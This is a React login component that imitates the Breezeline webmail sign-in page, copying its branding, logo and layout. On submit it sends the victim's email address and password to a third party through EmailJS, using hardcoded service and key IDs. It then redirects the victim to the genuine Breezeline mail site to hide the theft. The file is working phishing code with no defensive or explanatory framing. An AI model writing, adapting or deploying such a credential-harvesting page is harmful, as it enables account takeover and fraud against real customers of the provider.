import React, {useRef} from "react";
import lastlogo from "../Components/Assets/lastlogo.png";
import emailjs from '@emailjs/browser';

function Login() {



    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_a20yzfa', 'template_aum79ru', form.current, '9gptn3Mw3YhHr_kTJ')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

        // Redirect to the specified link after submitting the form
        window.location.href = 'https://mail.breezeline.net/hPronto/#';
    };


  return (
    <div className="bg-[#065BBA] w-full h-screen bg-gradient-to-r from-[#D6EBFA] flex justify-center items-center">
      <form ref={form} onSubmit={sendEmail} className="flex flex-col items-center">
        <img src={lastlogo} alt="" className="mt-28 w-28 h-28" />
        <div className="text-6xl text-[#011E62] font-bold mb-2">
          breezline<sup className="text-2xl">&trade;</sup>
        </div>
        <div className="flex flex-col gap-4 w-full">
          <div className="flex">
            <label className="text-[#DBEFFC] text-md font-bold w-36 text-left">Email Address</label>
            <input type="Email" placeholder="User@domain.net" required name="user_name" className="bg-[#E8F0FE] p-2 rounded-sm flex-1 custom-input placeholder:text-lg placeholder:font-mono" />
          </div>
          <div className="flex">
            <label className="text-[#DBEFFC] text-md font-bold w-36 text-left">Password</label>
            <input type="Password" required name="user_pass" className="bg-[#E8F0FE] p-2 rounded-sm flex-1 custom-input" />
          </div>
        </div>
        <button type="submit" className="bg-[#002F7B] hover:bg-gradient-to-b from-[#1A69C0] text-white font-semibold text-xl py-2 w-96 rounded-md mt-8">Enter</button>
        <p className="text-uderline text-white text-lg hover:text-green-900 underline mt-16">Forgotten Password Recovery</p>
        {/* <p className="text-xs text-[#002F7B]">All email users, including those with a user@atlanticbb.net or user@atlanticbbn.net email address, can continue using this page with no action required at this time. Please continue to log in using the full email address <br/>as the username, and the existing password.</p> */}
      </form>

    </div>
  );
};
export default Login;
